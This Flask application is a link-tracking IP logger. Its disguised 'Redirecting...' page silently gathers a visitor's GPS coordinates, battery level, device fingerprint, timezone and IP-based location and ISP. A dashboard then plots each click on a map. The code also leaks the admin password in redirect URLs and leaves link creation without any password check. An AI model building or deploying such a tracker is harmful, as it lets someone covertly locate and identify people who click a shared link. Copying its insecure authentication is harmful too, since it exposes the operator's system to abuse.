from flask import Flask, request, redirect, render_template_string, jsonify
from datetime import datetime
import json
import os
import hashlib
import urllib.request

app = Flask(__name__)

# Store logs in a JSON file (use a DB for production)
LOG_FILE = "clicks.json"

def load_logs():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            return json.load(f)
    return []

def save_log(entry):
    logs = load_logs()
    logs.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(logs, f, indent=2)

# Admin password (set via environment variable)
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "changeme123")

def get_ip_location(ip):
    """Lookup IP geolocation using ip-api.com (free, no key needed)."""
    try:
        real_ip = ip.split(",")[0].strip()
        url = f"http://ip-api.com/json/{real_ip}?fields=status,country,regionName,city,isp,lat,lon,query"
        req = urllib.request.Request(url, headers={"User-Agent": "LinkTracker/1.0"})
        with urllib.request.urlopen(req, timeout=3) as resp:
            data = json.loads(resp.read().decode())
            if data.get("status") == "success":
                return {
                    "city": data.get("city", "Unknown"),
                    "region": data.get("regionName", ""),
                    "country": data.get("country", "Unknown"),
                    "isp": data.get("isp", "Unknown"),
                    "real_ip": data.get("query", real_ip),
                    "ip_lat": data.get("lat", ""),
                    "ip_lon": data.get("lon", ""),
                }
    except:
        pass
    return {"city": "Unknown", "region": "", "country": "Unknown", "isp": "Unknown", "real_ip": ip.split(",")[0].strip(), "ip_lat": "", "ip_lon": ""}

def parse_user_agent(ua):
    """Extract device, OS, and browser from User-Agent string."""
    device = "Unknown"
    os_name = "Unknown"
    browser = "Unknown"

    if "iPhone" in ua:
        device = "iPhone"
        os_name = "iOS"
    elif "iPad" in ua:
        device = "iPad"
        os_name = "iOS"
    elif "Android" in ua:
        os_name = "Android"
        try:
            start = ua.index("Android")
            segment = ua[start:]
            if ";" in segment:
                parts = segment.split(";")
                if len(parts) > 1:
                    model = parts[1].strip()
                    if "Build" in model:
                        model = model[:model.index("Build")].strip()
                    if ")" in model:
                        model = model[:model.index(")")].strip()
                    device = model if model else "Android Device"
                else:
                    device = "Android Device"
            else:
                device = "Android Device"
        except:
            device = "Android Device"
    elif "Windows" in ua:
        device = "PC"
        os_name = "Windows"
        if "Windows NT 10.0" in ua:
            os_name = "Windows 10/11"
        elif "Windows NT 6.3" in ua:
            os_name = "Windows 8.1"
    elif "Macintosh" in ua:
        device = "Mac"
        os_name = "macOS"
    elif "Linux" in ua:
        device = "PC"
        os_name = "Linux"

    if "Edg/" in ua:
        browser = "Edge"
    elif "Chrome/" in ua and "Safari/" in ua:
        browser = "Chrome"
    elif "Firefox/" in ua:
        browser = "Firefox"
    elif "Safari/" in ua:
        browser = "Safari"
    elif "Opera" in ua or "OPR/" in ua:
        browser = "Opera"

    return device, os_name, browser


# ---- TRACKING PAGE (collects JS data + GPS) ----
TRACKER_PAGE = """
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Redirecting...</title>
<style>
    body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
    .loader { text-align: center; color: #666; }
    .spinner { border: 3px solid #eee; border-top: 3px solid #333; border-radius: 50%; width: 30px; height: 30px; animation: spin 0.8s linear infinite; margin: 0 auto 15px; }
    @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="loader">
    <div class="spinner"></div>
    <p>Loading, please wait...</p>
</div>
<script>
async function collect() {
    const data = {
        link_id: "{{ link_id }}",
        // Screen info
        screen_width: screen.width,
        screen_height: screen.height,
        viewport_width: window.innerWidth,
        viewport_height: window.innerHeight,
        color_depth: screen.colorDepth,
        pixel_ratio: window.devicePixelRatio || 1,
        // Timezone
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezone_offset: new Date().getTimezoneOffset(),
        // System
        language: navigator.language,
        languages: navigator.languages ? navigator.languages.join(',') : navigator.language,
        platform: navigator.platform || '',
        cpu_cores: navigator.hardwareConcurrency || 'unknown',
        device_memory: navigator.deviceMemory || 'unknown',
        touch_support: ('ontouchstart' in window) || (navigator.maxTouchPoints > 0),
        connection_type: (navigator.connection && navigator.connection.effectiveType) || 'unknown',
        // GPS
        gps_lat: null,
        gps_lon: null,
        gps_accuracy: null,
        // Battery
        battery_level: null,
        battery_charging: null,
    };

    // Try to get GPS location
    try {
        const pos = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true,
                timeout: 5000,
                maximumAge: 0
            });
        });
        data.gps_lat = pos.coords.latitude;
        data.gps_lon = pos.coords.longitude;
        data.gps_accuracy = pos.coords.accuracy;
    } catch(e) {
        // User denied or not available
    }

    // Try to get battery info
    try {
        if (navigator.getBattery) {
            const batt = await navigator.getBattery();
            data.battery_level = Math.round(batt.level * 100);
            data.battery_charging = batt.charging;
        }
    } catch(e) {}

    // Send data to server
    try {
        await fetch('/collect', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        });
    } catch(e) {}

    // Redirect to target
    window.location.href = "{{ target_url }}";
}

// Start collection immediately
collect();

// Fallback redirect after 8 seconds in case something hangs
setTimeout(() => { window.location.href = "{{ target_url }}"; }, 8000);
</script>
</body>
</html>
"""


# ---- TRACKING ENDPOINT ----
@app.route("/t/<link_id>")
def track(link_id):
    """Show the tracking page that collects JS data then redirects."""
    links = load_links()
    target = links.get(link_id)

    if not target:
        return "Link not found", 404

    # Log basic server-side data immediately
    ua = request.headers.get("User-Agent", "")
    device, os_name, browser = parse_user_agent(ua)
    raw_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    location = get_ip_location(raw_ip)

    entry = {
        "link_id": link_id,
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "ip": location["real_ip"],
        "user_agent": ua,
        "device": device,
        "os": os_name,
        "browser": browser,
        "referrer": request.headers.get("Referer", "Direct"),
        "city": location["city"],
        "region": location["region"],
        "country": location["country"],
        "isp": location["isp"],
        "ip_lat": location.get("ip_lat", ""),
        "ip_lon": location.get("ip_lon", ""),
        # JS data will be merged later
        "screen": "",
        "timezone": "",
        "cpu_cores": "",
        "device_memory": "",
        "battery": "",
        "connection": "",
        "gps_lat": "",
        "gps_lon": "",
        "gps_accuracy": "",
    }

    save_log(entry)

    return render_template_string(TRACKER_PAGE, link_id=link_id, target_url=target)


@app.route("/collect", methods=["POST"])
def collect():
    """Receive JS-collected data and merge with the latest log entry."""
    try:
        data = request.get_json(force=True)
        link_id = data.get("link_id", "")

        logs = load_logs()
        # Find the most recent entry for this link_id and update it
        for log in reversed(logs):
            if log.get("link_id") == link_id and not log.get("screen"):
                log["screen"] = f"{data.get('screen_width', '?')}x{data.get('screen_height', '?')}"
                log["viewport"] = f"{data.get('viewport_width', '?')}x{data.get('viewport_height', '?')}"
                log["pixel_ratio"] = str(data.get("pixel_ratio", ""))
                log["timezone"] = data.get("timezone", "")
                log["language"] = data.get("language", "")
                log["platform"] = data.get("platform", "")
                log["cpu_cores"] = str(data.get("cpu_cores", ""))
                log["device_memory"] = str(data.get("device_memory", "")) + " GB" if data.get("device_memory") and data.get("device_memory") != "unknown" else ""
                log["connection"] = data.get("connection_type", "")
                log["touch"] = data.get("touch_support", False)

                if data.get("battery_level") is not None:
                    charging = "Charging" if data.get("battery_charging") else "Not charging"
                    log["battery"] = f"{data['battery_level']}% ({charging})"

                if data.get("gps_lat") is not None:
                    log["gps_lat"] = data["gps_lat"]
                    log["gps_lon"] = data["gps_lon"]
                    log["gps_accuracy"] = f"{data.get('gps_accuracy', '?')}m"

                break

        with open(LOG_FILE, "w") as f:
            json.dump(logs, f, indent=2)

    except:
        pass

    return jsonify({"ok": True})


# ---- LINK MANAGEMENT ----
LINKS_FILE = "links.json"

def load_links():
    if os.path.exists(LINKS_FILE):
        with open(LINKS_FILE, "r") as f:
            return json.load(f)
    return {}

def save_links(links):
    with open(LINKS_FILE, "w") as f:
        json.dump(links, f, indent=2)


# ---- DASHBOARD ----
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Link Tracker Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0f172a; color: #e2e8f0; padding: 20px; }
        h1 { color: #38bdf8; margin-bottom: 20px; }
        h2 { color: #94a3b8; margin: 20px 0 10px; font-size: 1.1em; }

        .stats { display: flex; gap: 15px; margin-bottom: 25px; flex-wrap: wrap; }
        .stat-card { background: #1e293b; padding: 15px 20px; border-radius: 10px; min-width: 120px; }
        .stat-card .number { font-size: 2em; font-weight: bold; color: #38bdf8; }
        .stat-card .label { color: #94a3b8; font-size: 0.85em; }

        .section { background: #1e293b; border-radius: 10px; padding: 20px; margin-bottom: 20px; }

        .form-row { display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap; }
        input[type="text"] { background: #0f172a; border: 1px solid #334155; color: #e2e8f0; padding: 10px 14px; border-radius: 8px; flex: 1; min-width: 200px; }
        button { background: #38bdf8; color: #0f172a; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: 600; }
        button:hover { background: #7dd3fc; }

        .link-item { background: #0f172a; padding: 12px; border-radius: 8px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px; }
        .link-url { color: #38bdf8; word-break: break-all; font-size: 0.9em; }
        .link-target { color: #64748b; font-size: 0.8em; word-break: break-all; }
        .copy-btn { background: #334155; color: #e2e8f0; padding: 5px 12px; border-radius: 5px; font-size: 0.8em; cursor: pointer; border: none; }
        .copy-btn:hover { background: #475569; }

        /* Click cards */
        .click-card { background: #0f172a; border-radius: 10px; padding: 16px; margin-bottom: 12px; border-left: 3px solid #38bdf8; }
        .click-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; flex-wrap: wrap; gap: 8px; }
        .click-time { color: #94a3b8; font-size: 0.85em; }
        .click-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 8px; }
        .click-field { }
        .click-field .label { color: #64748b; font-size: 0.75em; text-transform: uppercase; letter-spacing: 0.5px; }
        .click-field .value { color: #e2e8f0; font-size: 0.9em; margin-top: 2px; }

        .tag { background: #334155; padding: 2px 8px; border-radius: 4px; font-size: 0.8em; display: inline-block; }
        .tag-blue { background: #1e3a5f; color: #7dd3fc; }
        .tag-green { background: #1a2e1a; color: #86efac; }
        .tag-orange { background: #3d2800; color: #fbbf24; }
        .tag-red { background: #3d0000; color: #fca5a5; }

        .gps-link { color: #38bdf8; text-decoration: none; font-size: 0.85em; }
        .gps-link:hover { text-decoration: underline; }

        .empty { color: #64748b; text-align: center; padding: 40px; }

        @media (max-width: 600px) {
            .click-grid { grid-template-columns: 1fr 1fr; }
        }
    </style>
</head>
<body>
    <h1>🔗 Link Tracker</h1>

    <div class="stats">
        <div class="stat-card">
            <div class="number">{{ total_clicks }}</div>
            <div class="label">Total Clicks</div>
        </div>
        <div class="stat-card">
            <div class="number">{{ unique_ips }}</div>
            <div class="label">Unique Visitors</div>
        </div>
        <div class="stat-card">
            <div class="number">{{ total_links }}</div>
            <div class="label">Active Links</div>
        </div>
    </div>

    <!-- Create new link -->
    <div class="section">
        <h2>Create Tracking Link</h2>
        <form method="POST" action="/dashboard/create">
            <div class="form-row">
                <input type="text" name="url" placeholder="Paste destination URL (e.g. https://google.com)" required>
                <input type="text" name="slug" placeholder="Custom slug (optional)">
                <button type="submit">Create Link</button>
            </div>
        </form>
    </div>

    <!-- Active links -->
    {% if links %}
    <div class="section">
        <h2>Your Links</h2>
        {% for slug, target in links.items() %}
        <div class="link-item">
            <div>
                <div class="link-url">{{ base_url }}/t/{{ slug }}</div>
                <div class="link-target">→ {{ target }}</div>
            </div>
            <button class="copy-btn" onclick="navigator.clipboard.writeText('{{ base_url }}/t/{{ slug }}')">Copy</button>
        </div>
        {% endfor %}
    </div>
    {% endif %}

    <!-- Click logs -->
    <div class="section">
        <h2>Recent Clicks</h2>
        {% if logs %}
        {% for log in logs|reverse %}
        <div class="click-card">
            <div class="click-header">
                <div>
                    <span class="tag">{{ log.link_id }}</span>
                    <span class="click-time">{{ log.timestamp[:19] }} UTC</span>
                </div>
                {% if log.get('gps_lat') and log.gps_lat != '' %}
                <a class="gps-link" href="https://www.google.com/maps?q={{ log.gps_lat }},{{ log.gps_lon }}" target="_blank">📍 View on Map (GPS: {{ log.gps_accuracy }})</a>
                {% elif log.get('ip_lat') and log.ip_lat != '' %}
                <a class="gps-link" href="https://www.google.com/maps?q={{ log.ip_lat }},{{ log.ip_lon }}" target="_blank">📍 View on Map (IP approx)</a>
                {% endif %}
            </div>
            <div class="click-grid">
                <div class="click-field">
                    <div class="label">IP Address</div>
                    <div class="value">{{ log.ip }}</div>
                </div>
                <div class="click-field">
                    <div class="label">Location</div>
                    <div class="value"><span class="tag tag-blue">{{ log.get('city', 'N/A') }}{% if log.get('region') %}, {{ log.region }}{% endif %}, {{ log.get('country', '') }}</span></div>
                </div>
                <div class="click-field">
                    <div class="label">ISP / Network</div>
                    <div class="value"><span class="tag tag-green">{{ log.get('isp', 'N/A') }}</span></div>
                </div>
                <div class="click-field">
                    <div class="label">Device</div>
                    <div class="value">{{ log.device }}</div>
                </div>
                <div class="click-field">
                    <div class="label">OS</div>
                    <div class="value">{{ log.os }}</div>
                </div>
                <div class="click-field">
                    <div class="label">Browser</div>
                    <div class="value">{{ log.browser }}</div>
                </div>
                {% if log.get('screen') %}
                <div class="click-field">
                    <div class="label">Screen</div>
                    <div class="value">{{ log.screen }} ({{ log.get('pixel_ratio', '') }}x)</div>
                </div>
                {% endif %}
                {% if log.get('timezone') %}
                <div class="click-field">
                    <div class="label">Timezone</div>
                    <div class="value">{{ log.timezone }}</div>
                </div>
                {% endif %}
                {% if log.get('battery') %}
                <div class="click-field">
                    <div class="label">Battery</div>
                    <div class="value"><span class="tag tag-orange">{{ log.battery }}</span></div>
                </div>
                {% endif %}
                {% if log.get('connection') %}
                <div class="click-field">
                    <div class="label">Connection</div>
                    <div class="value">{{ log.connection }}</div>
                </div>
                {% endif %}
                {% if log.get('cpu_cores') %}
                <div class="click-field">
                    <div class="label">CPU / RAM</div>
                    <div class="value">{{ log.cpu_cores }} cores{% if log.get('device_memory') %} / {{ log.device_memory }}{% endif %}</div>
                </div>
                {% endif %}
            </div>
        </div>
        {% endfor %}
        {% else %}
        <div class="empty">No clicks yet. Share a link to start tracking!</div>
        {% endif %}
    </div>
</body>
</html>
"""

@app.route("/dashboard")
def dashboard():
    pw = request.args.get("pw", "")
    if pw != ADMIN_PASSWORD:
        return render_template_string("""
        <!DOCTYPE html><html><head><title>Login</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body { font-family: sans-serif; background: #0f172a; color: #e2e8f0; display: flex; justify-content: center; align-items: center; height: 100vh; }
            form { background: #1e293b; padding: 30px; border-radius: 12px; }
            input { background: #0f172a; border: 1px solid #334155; color: #e2e8f0; padding: 10px; border-radius: 8px; width: 100%; margin: 10px 0; }
            button { background: #38bdf8; color: #0f172a; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: 600; }
        </style></head><body>
        <form method="GET" action="/dashboard">
            <h2>🔒 Dashboard Login</h2>
            <input type="password" name="pw" placeholder="Enter password">
            <button type="submit">Enter</button>
        </form></body></html>
        """)

    logs = load_logs()
    links = load_links()
    unique_ips = len(set(l.get("ip", "") for l in logs))
    base_url = request.host_url.rstrip("/")

    return render_template_string(DASHBOARD_HTML,
        logs=logs,
        links=links,
        total_clicks=len(logs),
        unique_ips=unique_ips,
        total_links=len(links),
        base_url=base_url
    )


@app.route("/dashboard/create", methods=["POST"])
def create_link():
    pw = request.args.get("pw", request.form.get("pw", ""))
    url = request.form.get("url", "").strip()
    slug = request.form.get("slug", "").strip()

    if not url:
        return redirect(f"/dashboard?pw={ADMIN_PASSWORD}")

    if not slug:
        slug = hashlib.md5(url.encode()).hexdigest()[:6]

    links = load_links()
    links[slug] = url
    save_links(links)

    return redirect(f"/dashboard?pw={ADMIN_PASSWORD}")


@app.route("/")
def home():
    return redirect("/dashboard")


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
